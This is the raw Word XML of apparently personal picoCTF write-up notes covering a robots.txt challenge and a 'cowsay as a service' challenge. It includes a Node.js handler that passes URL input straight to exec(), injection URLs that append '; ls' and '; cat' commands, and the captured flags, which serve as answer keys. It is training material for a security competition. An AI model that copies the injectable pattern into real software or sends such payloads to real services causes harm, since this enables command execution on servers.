    <w:p w14:paraId="3FA9F713" w14:textId="43ED4AE6" w:rsidR="00E217C1" w:rsidRDefault="005047B5" w:rsidP="008B4ABA">
      <w:pPr>
        <w:pStyle w:val="BodyText"/>
        <w:rPr>
          <w:lang w:val="en-CA"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="005047B5">
        <w:rPr>
          <w:lang w:val="en-CA"/>
        </w:rPr>
        <w:t>Congrats! You completed the scavenger hunt. Part 5: _7a46d25d}</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="02D79E22" w14:textId="36708B64" w:rsidR="008B4ABA" w:rsidRDefault="008B4ABA" w:rsidP="008B4ABA">
      <w:pPr>
        <w:pStyle w:val="BodyText"/>
        <w:rPr>
          <w:lang w:val="en-CA"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="008B4ABA">
        <w:rPr>
          <w:lang w:val="en-CA"/>
        </w:rPr>
        <w:t>picoCTF{t</w:t>
      </w:r>
      <w:r w:rsidRPr="002C0966">
        <w:rPr>
          <w:lang w:val="en-CA"/>
        </w:rPr>
        <w:t>h4ts_4_l0</w:t>
      </w:r>
      <w:r w:rsidRPr="008B4ABA">
        <w:rPr>
          <w:lang w:val="en-CA"/>
        </w:rPr>
        <w:t>t_0f_pl4c</w:t>
      </w:r>
      <w:r w:rsidR="00E217C1" w:rsidRPr="00E217C1">
        <w:rPr>
          <w:lang w:val="en-CA"/>
        </w:rPr>
        <w:t>3s_2_lO0k</w:t>
      </w:r>
      <w:r w:rsidR="005047B5" w:rsidRPr="005047B5">
        <w:rPr>
          <w:lang w:val="en-CA"/>
        </w:rPr>
        <w:t>_7a46d25d</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:lang w:val="en-CA"/>
        </w:rPr>
        <w:t>}</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="14DD28D4" w14:textId="77777777" w:rsidR="00C07BA2" w:rsidRDefault="00C07BA2" w:rsidP="00C07BA2">
      <w:pPr>
        <w:pStyle w:val="BodyText"/>
        <w:rPr>
          <w:b/>
          <w:bCs/>
          <w:lang w:val="en-CA"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="178B0DAF" w14:textId="77777777" w:rsidR="00C07BA2" w:rsidRDefault="00C07BA2" w:rsidP="00C07BA2">
      <w:pPr>
        <w:pStyle w:val="BodyText"/>
        <w:rPr>
          <w:b/>
          <w:bCs/>
          <w:lang w:val="en-CA"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="20A86B18" w14:textId="77777777" w:rsidR="00961C9B" w:rsidRDefault="00961C9B" w:rsidP="00961C9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where are the robots</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="78212DE4"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BEA6A2F"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Tags: picoCTF 2019Web Exploitation</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="5AF84558" w14:textId="77777777" w:rsidR="00961C9B" w:rsidRDefault="00961C9B" w:rsidP="00961C9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01892A9F" w14:textId="77777777" w:rsidR="00961C9B" w:rsidRDefault="00961C9B" w:rsidP="00961C9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634CD96" w14:textId="2A289DF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find the robots? </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="HTMLCode"/>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
          <w:color w:val="F3A4B5"/>
          <w:sz w:val="21"/>
          <w:szCs w:val="21"/>
        </w:rPr>
        <w:t>https://jupiter.challenges.picoctf.org/problem/36474/</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Open Sans" w:hAnsi="Open Sans" w:cs="Open Sans"/>
          <w:color w:val="222A42"/>
          <w:sz w:val="27"/>
          <w:szCs w:val="27"/>
        </w:rPr>
        <w:t> (</w:t>
      </w:r>
      <w:hyperlink r:id="rId67"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68" w:history="1">
        <w:r w:rsidRPr="001B2A6B">
          <w:rPr>
            <w:rStyle w:val="Hyperlink"/>
            <w:rFonts w:ascii="Open Sans" w:hAnsi="Open Sans" w:cs="Open Sans"/>
            <w:sz w:val="27"/>
            <w:szCs w:val="27"/>
          </w:rPr>
          <w:t>http://jupiter.challenges.picoctf.org:36474</w:t>
        </w:r>
      </w:hyperlink>
    </w:p>
    <w:p w14:paraId="73403270" w14:textId="0E1039D1"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/robots.txt </w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="1F86AD84" w14:textId="2833233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Return an error with a  html /477ce.html</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="067D3952" w14:textId="582D1B7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5582E6DD" wp14:editId="19DF8F31">
            <wp:extent cx="5281118" cy="150127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69"/>
                    <a:stretch>
                      <a:fillRect/>
                    </a:stretch>
                  </pic:blipFill>
                  <pic:spPr>
                    <a:xfrm>
                      <a:off x="0" y="0"/>
                      <a:ext cx="5281118" cy="1501270"/>
                    </a:xfrm>
                    <a:prstGeom prst="rect">
                      <a:avLst/>
                    </a:prstGeom>
                  </pic:spPr>
                </pic:pic>
              </a:graphicData>
            </a:graphic>
          </wp:inline>
        </w:drawing>
      </w:r>
    </w:p>
    <w:p w14:paraId="07AD9438" w14:textId="72C97B5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p>
    <w:p w14:paraId="368E98D8" w14:textId="4A42A79F"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7A254B1C" wp14:editId="03BF74E6">
            <wp:extent cx="5380186" cy="1638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0186" cy="1638442"/>
                    </a:xfrm>
                    <a:prstGeom prst="rect">
                      <a:avLst/>
                    </a:prstGeom>
                  </pic:spPr>
                </pic:pic>
              </a:graphicData>
            </a:graphic>
          </wp:inline>
        </w:drawing>
      </w:r>
    </w:p>
    <w:p w14:paraId="614EE858" w14:textId="51666065" w:rsidR="008B4ABA" w:rsidRDefault="00961C9B" w:rsidP="00961C9B">
      <w:pPr>
        <w:pStyle w:val="BodyText"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Roboto" w:hAnsi="Roboto"/>
          <w:color w:val="FFFFFF"/>
          <w:sz w:val="27"/>
          <w:szCs w:val="27"/>
          <w:shd w:val="clear" w:color="auto" w:fill="000000"/>
        </w:rPr>
        <w:lastRenderedPageBreak/>
        <w:t>Guess you found the robots</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Roboto" w:hAnsi="Roboto"/>
          <w:color w:val="FFFFFF"/>
          <w:sz w:val="27"/>
          <w:szCs w:val="27"/>
        </w:rPr>
        <w:br/>
      </w:r>
      <w:r>
        <w:t>picoCTF{ca1cu1at1ng_Mach1n3s_477ce}</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="5F8CD5C9" w14:textId="38F26AB8" w:rsidR="00B335C0" w:rsidRDefault="00B335C0" w:rsidP="00961C9B">
      <w:pPr>
        <w:pStyle w:val="BodyText"/>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="46F4E17F" w14:textId="3B7B9802" w:rsidR="00B335C0" w:rsidRDefault="00B335C0" w:rsidP="00961C9B">
      <w:pPr>
        <w:pStyle w:val="BodyText"/>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="7082D17C" w14:textId="7D1E6CCC" w:rsidR="00B335C0" w:rsidRDefault="00E45D20" w:rsidP="00B335C0">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w:t>
      </w:r>
      <w:r w:rsidR="00B335C0">
        <w:rPr>
          <w:rFonts w:ascii="inherit" w:hAnsi="inherit" w:cs="Open Sans"/>
          <w:b w:val="0"/>
          <w:bCs w:val="0"/>
          <w:color w:val="1D253B"/>
        </w:rPr>
        <w:t>aas</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="inherit" w:hAnsi="inherit" w:cs="Open Sans"/>
          <w:b w:val="0"/>
          <w:bCs w:val="0"/>
          <w:color w:val="1D253B"/>
        </w:rPr>
        <w:t xml:space="preserve">   </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="inherit" w:hAnsi="inherit" w:cs="Open Sans"/>
          <w:b w:val="0"/>
          <w:bCs w:val="0"/>
          <w:color w:val="FF0000"/>
        </w:rPr>
        <w:t>HARD</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="65AB77AF" w14:textId="6E371D21"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r w:rsidR="00E45D20">
        <w:rPr>
          <w:rFonts w:ascii="Open Sans" w:hAnsi="Open Sans" w:cs="Open Sans"/>
          <w:color w:val="212121"/>
          <w:sz w:val="27"/>
          <w:szCs w:val="27"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="7E1B554E" w14:textId="77777777"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Tags: picoMini by redpwnWeb Exploitation</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="79A47E47" w14:textId="77777777" w:rsidR="00B335C0" w:rsidRDefault="00B335C0" w:rsidP="00B335C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BROWNIEINMOTION</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="368D6E31" w14:textId="77777777" w:rsidR="00B335C0" w:rsidRDefault="00B335C0" w:rsidP="00B335C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AC92624" w14:textId="77777777" w:rsidR="00B335C0" w:rsidRDefault="00B335C0" w:rsidP="00B335C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Now presenting </w:t>
      </w:r>
      <w:hyperlink r:id="rId71" w:tgtFrame="_blank" w:history="1">
        <w:r>
          <w:rPr>
            <w:rStyle w:val="Hyperlink"/>
            <w:rFonts w:ascii="Open Sans" w:hAnsi="Open Sans" w:cs="Open Sans"/>
            <w:color w:val="5969F6"/>
            <w:sz w:val="27"/>
            <w:szCs w:val="27"/>
          </w:rPr>
          <w:t>cowsay as a service</w:t>
        </w:r>
      </w:hyperlink>
    </w:p>
    <w:p w14:paraId="41C912D6" w14:textId="77777777" w:rsidR="00B335C0" w:rsidRDefault="00000000" w:rsidP="00B335C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365831FF">
          <v:rect id="_x0000_i1025" style="width:0;height:0" o:hralign="center" o:hrstd="t" o:hr="t" fillcolor="#a0a0a0" stroked="f"/>
        </w:pict>
      </w:r>
    </w:p>
    <w:tbl>
      <w:tblPr>
        <w:tblW w:w="6966" w:type="dxa"/>
        <w:tblCellMar>
          <w:top w:w="15" w:type="dxa"/>
          <w:left w:w="15" w:type="dxa"/>
          <w:bottom w:w="15" w:type="dxa"/>
          <w:right w:w="15" w:type="dxa"/>
        </w:tblCellMar>
        <w:tblLook w:val="04A0" w:firstRow="1" w:lastRow="0" w:firstColumn="1" w:lastColumn="0" w:noHBand="0" w:noVBand="1"/>
      </w:tblPr>
      <w:tblGrid>
        <w:gridCol w:w="5072"/>
        <w:gridCol w:w="1894"/>
      </w:tblGrid>
      <w:tr w:rsidR="00B335C0" w14:paraId="2D4E9D7E" w14:textId="77777777" w:rsidTr="00B335C0">
        <w:trPr>
          <w:gridAfter w:val="1"/>
          <w:tblHeader/>
        </w:trPr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="0" w:type="auto"/>
            <w:shd w:val="clear" w:color="auto" w:fill="auto"/>
            <w:tcMar>
              <w:top w:w="180" w:type="dxa"/>
              <w:left w:w="105" w:type="dxa"/>
              <w:bottom w:w="180" w:type="dxa"/>
              <w:right w:w="105" w:type="dxa"/>
            </w:tcMar>
            <w:vAlign w:val="center"/>
            <w:hideMark/>
          </w:tcPr>
          <w:p w14:paraId="59E47AFA" w14:textId="77777777" w:rsidR="00B335C0" w:rsidRDefault="00B335C0">
            <w:pPr>
              <w:jc w:val="center"/>
              <w:rPr>
                <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
                <w:b/>
                <w:bCs/>
                <w:caps/>
                <w:color w:val="212121"/>
                <w:sz w:val="19"/>
                <w:szCs w:val="19"/>
              </w:rPr>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:b/>
                <w:bCs/>
                <w:caps/>
                <w:color w:val="212121"/>
                <w:sz w:val="19"/>
                <w:szCs w:val="19"/>
              </w:rPr>
              <w:t>CHALLENGE ENDPOINTS</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr w:rsidR="00B335C0" w14:paraId="4183D2E9" w14:textId="77777777" w:rsidTr="00B335C0">
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="0" w:type="auto"/>
            <w:shd w:val="clear" w:color="auto" w:fill="auto"/>
            <w:tcMar>
              <w:top w:w="180" w:type="dxa"/>
              <w:left w:w="105" w:type="dxa"/>
              <w:bottom w:w="180" w:type="dxa"/>
              <w:right w:w="105" w:type="dxa"/>
            </w:tcMar>
            <w:vAlign w:val="center"/>
            <w:hideMark/>
          </w:tcPr>
          <w:p w14:paraId="3BFCA7FE" w14:textId="77777777" w:rsidR="00B335C0" w:rsidRDefault="00B335C0">
            <w:pPr>
              <w:rPr>
                <w:color w:val="212121"/>
              </w:rPr>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:color w:val="212121"/>
              </w:rPr>
              <w:t>Download index.js</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="0" w:type="auto"/>
            <w:shd w:val="clear" w:color="auto" w:fill="auto"/>
            <w:tcMar>
              <w:top w:w="180" w:type="dxa"/>
              <w:left w:w="105" w:type="dxa"/>
              <w:bottom w:w="180" w:type="dxa"/>
              <w:right w:w="105" w:type="dxa"/>
            </w:tcMar>
            <w:vAlign w:val="center"/>
            <w:hideMark/>
          </w:tcPr>
          <w:p w14:paraId="66C57E1C" w14:textId="77777777" w:rsidR="00B335C0" w:rsidRDefault="00000000">
            <w:pPr>
              <w:rPr>
                <w:color w:val="212121"/>
              </w:rPr>
            </w:pPr>
            <w:hyperlink r:id="rId72" w:tgtFrame="_blank" w:history="1">
              <w:r w:rsidR="00B335C0">
                <w:rPr>
                  <w:rStyle w:val="Hyperlink"/>
                  <w:color w:val="5969F6"/>
                </w:rPr>
                <w:t>index.js</w:t>
              </w:r>
            </w:hyperlink>
          </w:p>
        </w:tc>
      </w:tr>
    </w:tbl>
    <w:p w14:paraId="592FD860" w14:textId="77777777" w:rsidR="00B335C0" w:rsidRPr="00B335C0" w:rsidRDefault="00B335C0" w:rsidP="00B335C0">
      <w:pPr>
        <w:pStyle w:val="BodyText"/>
        <w:rPr>
          <w:lang w:val="en-CA"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00B335C0">
        <w:rPr>
          <w:lang w:val="en-CA"/>
        </w:rPr>
        <w:t>const express = require('express');</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="1B8CCECB" w14:textId="77777777" w:rsidR="00B335C0" w:rsidRPr="00B335C0" w:rsidRDefault="00B335C0" w:rsidP="00B335C0">
      <w:pPr>
        <w:pStyle w:val="BodyText"/>
        <w:rPr>
          <w:lang w:val="en-CA"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00B335C0">
        <w:rPr>
          <w:lang w:val="en-CA"/>
        </w:rPr>
        <w:t>const app = express();</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="03E5F527" w14:textId="77777777" w:rsidR="00B335C0" w:rsidRPr="00B335C0" w:rsidRDefault="00B335C0" w:rsidP="00B335C0">
      <w:pPr>
        <w:pStyle w:val="BodyText"/>
        <w:rPr>
          <w:lang w:val="en-CA"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00B335C0">
        <w:rPr>
          <w:highlight w:val="yellow"/>
          <w:lang w:val="en-CA"/>
        </w:rPr>
        <w:t>const { exec } = require('child_process');</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="27FA7D83" w14:textId="77777777" w:rsidR="00B335C0" w:rsidRPr="00B335C0" w:rsidRDefault="00B335C0" w:rsidP="00B335C0">
      <w:pPr>
        <w:pStyle w:val="BodyText"/>
        <w:rPr>
          <w:lang w:val="en-CA"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="4FADC1BD" w14:textId="77777777" w:rsidR="00B335C0" w:rsidRPr="00B335C0" w:rsidRDefault="00B335C0" w:rsidP="00B335C0">
      <w:pPr>
        <w:pStyle w:val="BodyText"/>
        <w:rPr>
          <w:lang w:val="en-CA"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00B335C0">
        <w:rPr>
          <w:lang w:val="en-CA"/>
        </w:rPr>
        <w:t>app.use(express.static('public'));</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="57EE3D82" w14:textId="77777777" w:rsidR="00B335C0" w:rsidRPr="00B335C0" w:rsidRDefault="00B335C0" w:rsidP="00B335C0">
      <w:pPr>
        <w:pStyle w:val="BodyText"/>
        <w:rPr>
          <w:lang w:val="en-CA"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="69BA99DD" w14:textId="77777777" w:rsidR="00B335C0" w:rsidRPr="00B335C0" w:rsidRDefault="00B335C0" w:rsidP="00B335C0">
      <w:pPr>
        <w:pStyle w:val="BodyText"/>
        <w:rPr>
          <w:lang w:val="en-CA"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00B335C0">
        <w:rPr>
          <w:lang w:val="en-CA"/>
        </w:rPr>
        <w:t>app.get('/cowsay/:message', (req, res) =&gt; {</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="36AD93DE" w14:textId="77777777" w:rsidR="00B335C0" w:rsidRPr="00B335C0" w:rsidRDefault="00B335C0" w:rsidP="00B335C0">
      <w:pPr>
        <w:pStyle w:val="BodyText"/>
        <w:rPr>
          <w:lang w:val="en-CA"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00B335C0">
        <w:rPr>
          <w:lang w:val="en-CA"/>
        </w:rPr>
        <w:t xml:space="preserve">  </w:t>
      </w:r>
      <w:r w:rsidRPr="00B335C0">
        <w:rPr>
          <w:highlight w:val="yellow"/>
          <w:lang w:val="en-CA"/>
        </w:rPr>
        <w:t>exec(`/usr/games/cowsay ${req.params.message}`,</w:t>
      </w:r>
      <w:r w:rsidRPr="00B335C0">
        <w:rPr>
          <w:lang w:val="en-CA"/>
        </w:rPr>
        <w:t xml:space="preserve"> {timeout: 5000}, (error, stdout) =&gt; {</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="3C0E8AA8" w14:textId="77777777" w:rsidR="00B335C0" w:rsidRPr="00B335C0" w:rsidRDefault="00B335C0" w:rsidP="00B335C0">
      <w:pPr>
        <w:pStyle w:val="BodyText"/>
        <w:rPr>
          <w:lang w:val="en-CA"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00B335C0">
        <w:rPr>
          <w:lang w:val="en-CA"/>
        </w:rPr>
        <w:t xml:space="preserve">    if (error) return res.status(500).end();</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="14EA3529" w14:textId="77777777" w:rsidR="00B335C0" w:rsidRPr="00B335C0" w:rsidRDefault="00B335C0" w:rsidP="00B335C0">
      <w:pPr>
        <w:pStyle w:val="BodyText"/>
        <w:rPr>
          <w:lang w:val="en-CA"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00B335C0">
        <w:rPr>
          <w:lang w:val="en-CA"/>
        </w:rPr>
        <w:t xml:space="preserve">    res.type('txt').send(stdout).end();</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="78062F79" w14:textId="77777777" w:rsidR="00B335C0" w:rsidRPr="00B335C0" w:rsidRDefault="00B335C0" w:rsidP="00B335C0">
      <w:pPr>
        <w:pStyle w:val="BodyText"/>
        <w:rPr>
          <w:lang w:val="en-CA"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00B335C0">
        <w:rPr>
          <w:lang w:val="en-CA"/>
        </w:rPr>
        <w:t xml:space="preserve">  });</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="20581D09" w14:textId="77777777" w:rsidR="00B335C0" w:rsidRPr="00B335C0" w:rsidRDefault="00B335C0" w:rsidP="00B335C0">
      <w:pPr>
        <w:pStyle w:val="BodyText"/>
        <w:rPr>
          <w:lang w:val="en-CA"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00B335C0">
        <w:rPr>
          <w:lang w:val="en-CA"/>
        </w:rPr>
        <w:t>});</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="6F5EA148" w14:textId="77777777" w:rsidR="00B335C0" w:rsidRPr="00B335C0" w:rsidRDefault="00B335C0" w:rsidP="00B335C0">
      <w:pPr>
        <w:pStyle w:val="BodyText"/>
        <w:rPr>
          <w:lang w:val="en-CA"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="1C5E3E25" w14:textId="77777777" w:rsidR="00B335C0" w:rsidRPr="00B335C0" w:rsidRDefault="00B335C0" w:rsidP="00B335C0">
      <w:pPr>
        <w:pStyle w:val="BodyText"/>
        <w:rPr>
          <w:lang w:val="en-CA"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00B335C0">
        <w:rPr>
          <w:lang w:val="en-CA"/>
        </w:rPr>
        <w:t>app.listen(3000, () =&gt; {</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="6682D600" w14:textId="77777777" w:rsidR="00B335C0" w:rsidRPr="00B335C0" w:rsidRDefault="00B335C0" w:rsidP="00B335C0">
      <w:pPr>
        <w:pStyle w:val="BodyText"/>
        <w:rPr>
          <w:lang w:val="en-CA"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00B335C0">
        <w:rPr>
          <w:lang w:val="en-CA"/>
        </w:rPr>
        <w:t xml:space="preserve">  console.log('listening');</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="0F835A86" w14:textId="16EDF776" w:rsidR="00B335C0" w:rsidRDefault="00B335C0" w:rsidP="00B335C0">
      <w:pPr>
        <w:pStyle w:val="BodyText"/>
        <w:rPr>
          <w:lang w:val="en-CA"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00B335C0">
        <w:rPr>
          <w:lang w:val="en-CA"/>
        </w:rPr>
        <w:t>});</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="423B1A6C" w14:textId="18FF624C" w:rsidR="00B335C0" w:rsidRDefault="00B335C0" w:rsidP="00B335C0">
      <w:pPr>
        <w:pStyle w:val="BodyText"/>
        <w:rPr>
          <w:lang w:val="en-CA"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:lang w:val="en-CA"/>
        </w:rPr>
        <w:t>Command injection</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="59E77D9D" w14:textId="2CC6515D" w:rsidR="00B335C0" w:rsidRDefault="00B335C0" w:rsidP="00B335C0">
      <w:pPr>
        <w:pStyle w:val="BodyText"/>
        <w:rPr>
          <w:lang w:val="en-CA"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:lang w:val="en-CA"/>
        </w:rPr>
        <w:lastRenderedPageBreak/>
        <w:t>%20 -&gt; white space</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="02B19974" w14:textId="0ABB98F4" w:rsidR="00B335C0" w:rsidRDefault="00B335C0" w:rsidP="00B335C0">
      <w:pPr>
        <w:pStyle w:val="BodyText"/>
        <w:rPr>
          <w:lang w:val="en-CA"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00B335C0">
        <w:rPr>
          <w:lang w:val="en-CA"/>
        </w:rPr>
        <w:t>https://caas.mars.picoctf.net/cowsay/hellow;%20</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:lang w:val="en-CA"/>
        </w:rPr>
        <w:t>ls-l</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="186AB9A1" w14:textId="26591327" w:rsidR="00B335C0" w:rsidRDefault="00000000" w:rsidP="00B335C0">
      <w:pPr>
        <w:pStyle w:val="BodyText"/>
        <w:rPr>
          <w:lang w:val="en-CA"/>
        </w:rPr>
      </w:pPr>
      <w:hyperlink r:id="rId73" w:history="1">
        <w:r w:rsidR="00A226E0" w:rsidRPr="001B2A6B">
          <w:rPr>
            <w:rStyle w:val="Hyperlink"/>
            <w:lang w:val="en-CA"/>
          </w:rPr>
          <w:t>https://caas.mars.picoctf.net/cowsay/hellow;%20cat%20falg.txt</w:t>
        </w:r>
      </w:hyperlink>
    </w:p>
    <w:p w14:paraId="6671AE4E" w14:textId="1887CF57" w:rsidR="00A226E0" w:rsidRDefault="00A226E0" w:rsidP="00B335C0">
      <w:pPr>
        <w:pStyle w:val="BodyText"/>
        <w:rPr>
          <w:lang w:val="en-CA"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="2D29EB83" w14:textId="413A8E2D" w:rsidR="00A226E0" w:rsidRDefault="00A226E0" w:rsidP="00B335C0">
      <w:pPr>
        <w:pStyle w:val="BodyText"/>
        <w:rPr>
          <w:lang w:val="en-CA"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:noProof/>
        </w:rPr>
        <w:drawing>
          <wp:inline distT="0" distB="0" distL="0" distR="0" wp14:anchorId="246C4DEF" wp14:editId="69F67D26">
            <wp:extent cx="5128704" cy="159271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74"/>
                    <a:stretch>
                      <a:fillRect/>
                    </a:stretch>
                  </pic:blipFill>
                  <pic:spPr>
                    <a:xfrm>
                      <a:off x="0" y="0"/>
                      <a:ext cx="5128704" cy="1592718"/>
                    </a:xfrm>
                    <a:prstGeom prst="rect">
                      <a:avLst/>
                    </a:prstGeom>
                  </pic:spPr>
                </pic:pic>
              </a:graphicData>
            </a:graphic>
          </wp:inline>
        </w:drawing>
      </w:r>
    </w:p>
    <w:p w14:paraId="7E6D37B3" w14:textId="3EFEC8AF" w:rsidR="00A226E0" w:rsidRDefault="00A226E0" w:rsidP="00B335C0">
      <w:pPr>
        <w:pStyle w:val="BodyText"/>
        <w:rPr>
          <w:lang w:val="en-CA"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="4F65C8C0" w14:textId="31036EA0" w:rsidR="00A226E0" w:rsidRDefault="00A226E0" w:rsidP="00B335C0">
      <w:pPr>
        <w:pStyle w:val="BodyText"/>
        <w:rPr>
          <w:lang w:val="en-CA"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00A226E0">
        <w:rPr>
          <w:lang w:val="en-CA"/>
        </w:rPr>
        <w:t>picoCTF{moooooooooooooooooooooooooooooooooooooooooooooooooooooooooooo0o}</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="6BB7AF83" w14:textId="00D5280F" w:rsidR="00A226E0" w:rsidRDefault="00A226E0" w:rsidP="00B335C0">
      <w:pPr>
        <w:pStyle w:val="BodyText"/>
        <w:rPr>
          <w:lang w:val="en-CA"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="4875FBA3" w14:textId="21AFBECA" w:rsidR="00A226E0" w:rsidRPr="00A226E0" w:rsidRDefault="00A226E0" w:rsidP="00A226E0">
      <w:pPr>
        <w:pStyle w:val="BodyText"/>
        <w:rPr>
          <w:lang w:val="en-CA"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00A226E0">
        <w:rPr>
          <w:lang w:val="en-CA"/>
        </w:rPr>
        <w:t>Who are you?</w:t>
      </w:r>
      <w:r w:rsidR="00E45D20">
        <w:rPr>
          <w:lang w:val="en-CA"/>
        </w:rPr>
        <w:t xml:space="preserve">  </w:t>
      </w:r>
      <w:r w:rsidR="00E45D20">
        <w:rPr>
          <w:rFonts w:ascii="inherit" w:hAnsi="inherit" w:cs="Open Sans"/>
          <w:b/>
          <w:bCs/>
          <w:color w:val="FF0000"/>
        </w:rPr>
        <w:t>HARD</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="71436DF5" w14:textId="77777777" w:rsidR="00A226E0" w:rsidRPr="00A226E0" w:rsidRDefault="00A226E0" w:rsidP="00A226E0">
      <w:pPr>
        <w:pStyle w:val="BodyText"/>
        <w:rPr>
          <w:lang w:val="en-CA"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00A226E0">
        <w:rPr>
          <w:lang w:val="en-CA"/>
        </w:rPr>
        <w:t xml:space="preserve"> | 100 points</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="42DE56BA" w14:textId="77777777" w:rsidR="00A226E0" w:rsidRPr="00A226E0" w:rsidRDefault="00A226E0" w:rsidP="00A226E0">
      <w:pPr>
        <w:pStyle w:val="BodyText"/>
        <w:rPr>
          <w:lang w:val="en-CA"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00A226E0">
        <w:rPr>
          <w:lang w:val="en-CA"/>
        </w:rPr>
        <w:t xml:space="preserve">Tags: </w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="66B1E7D2" w14:textId="77777777" w:rsidR="00A226E0" w:rsidRPr="00A226E0" w:rsidRDefault="00A226E0" w:rsidP="00A226E0">
      <w:pPr>
        <w:pStyle w:val="BodyText"/>
        <w:rPr>
          <w:lang w:val="en-CA"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00A226E0">
        <w:rPr>
          <w:lang w:val="en-CA"/>
        </w:rPr>
        <w:t>AUTHOR: MADSTACKS</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="521763B7" w14:textId="77777777" w:rsidR="00A226E0" w:rsidRPr="00A226E0" w:rsidRDefault="00A226E0" w:rsidP="00A226E0">
      <w:pPr>
        <w:pStyle w:val="BodyText"/>
        <w:rPr>
          <w:lang w:val="en-CA"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="66594A0E" w14:textId="77777777" w:rsidR="00A226E0" w:rsidRPr="00A226E0" w:rsidRDefault="00A226E0" w:rsidP="00A226E0">
      <w:pPr>
        <w:pStyle w:val="BodyText"/>
        <w:rPr>
          <w:lang w:val="en-CA"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00A226E0">
        <w:rPr>
          <w:lang w:val="en-CA"/>
